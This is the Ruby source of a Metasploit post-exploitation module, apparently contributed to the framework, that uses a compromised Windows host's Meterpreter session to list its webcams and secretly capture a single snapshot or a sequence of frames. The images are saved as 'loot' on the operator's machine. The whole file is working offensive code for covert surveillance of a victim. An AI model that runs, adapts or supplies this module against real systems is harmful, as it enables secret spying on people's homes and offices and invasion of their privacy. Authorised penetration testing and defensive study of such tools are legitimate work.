##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Capture Webcam',
      'Description'   => %q{
          This module will allow the user to detect installed webcams, take a snapshot
           or generate a snapshot sequence.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['ByteZealot'],
      'Platform'      => ['win']
    ))

    register_options(
      [
        OptString.new('ACTION', [true, 'list, snapshot or sequence', 'snapshot']),
        OptInt.new('FRAMES', [true, 'The number of video frames', 100]),
        OptInt.new('INDEX',   [true, 'The index of the webcam to use', 1]),
        OptString.new('LOCATION', [true, 'The location to save the loot', '/root/Pictures/']),
        OptInt.new('QUALITY', [true, 'The JPEG image quality', 75])
      ], self.class)
  end

  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    action = datastore['ACTION']

    if not action
      print_error("Invalid action")
      return
    end

    case action
    when /^list$/i
      list_webcams(true)
    when /^snapshot$/i
      snapshot
    when /^sequence$/i
      sequence
    end
  end


  def rhost
    client.sock.peerhost
  end


  def sequence
    webcams = list_webcams
    if webcams.empty?
      print_error("#{rhost} - No webcams found...")
      return
    end

    if not webcams[datastore['INDEX']-1]
      print_error("#{rhost} - No such index: #{datastore['INDEX'].to_s}")
      return
    end

    print_status("#{rhost} - Starting...")
    client.webcam.webcam_start(datastore['INDEX'])

    frameQuality = datastore['QUALITY']

    frame = 0
    while frame < datastore['FRAMES']
      framePlusOne = frame+1

      buf = nil
      begin
        buf = client.webcam.webcam_get_frame(frameQuality)
        if buf
#          print_status("#{rhost} - Got frame #{framePlusOne}")

          ::File.open(datastore['LOCATION'] + "/snapshot_" + framePlusOne.to_s.rjust(7, "0") + ".jpg", 'wb') do |fd|
            fd.write(buf)
            fd.close()
          end
        end

        rescue Rex::Post::Meterpreter::RequestError => e
          print_error(e.message)
          return
      end
      frame = frame+1
    end
    client.webcam.webcam_stop
    print_status("#{rhost} - Stopped")
  end


  def snapshot
    webcams = list_webcams

    if webcams.empty?
      print_error("#{rhost} - No webcams found...")
      return
    end

    if not webcams[datastore['INDEX']-1]
      print_error("#{rhost} - No such index: #{datastore['INDEX'].to_s}")
      return
    end

    buf = nil
    begin
      print_status("#{rhost} - Starting...")
      client.webcam.webcam_start(datastore['INDEX'])

      buf = client.webcam.webcam_get_frame(datastore['QUALITY'])
      if buf
        print_status("#{rhost} - Got frame")

        ::File.open(datastore['LOCATION'] + "/snapshot.jpg", 'wb') do |fd|
          fd.write(buf)
        end

        print_good("#{rhost} - Snapshot saved.")
      end

      client.webcam.webcam_stop
      print_status("#{rhost} - Stopped")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error(e.message)
      return
    end
  end


  def list_webcams(show=false)
    begin
      webcams = client.webcam.webcam_list
    rescue Rex::Post::Meterpreter::RequestError
      webcams = []
    end

    if show
      tbl = Rex::Text::Table.new(
        'Header'  => 'Webcam List',
        'Indent'  => 1,
        'Columns' => ['Index', 'Name']
      )

      webcams.each_with_index do |name, indx|
        tbl <<  [(indx+1).to_s, name]
      end

      print_line(tbl.to_s)
    end

    return webcams
  end

end

# Special thx to Sinn3r for laying the ground for this post exploit module.

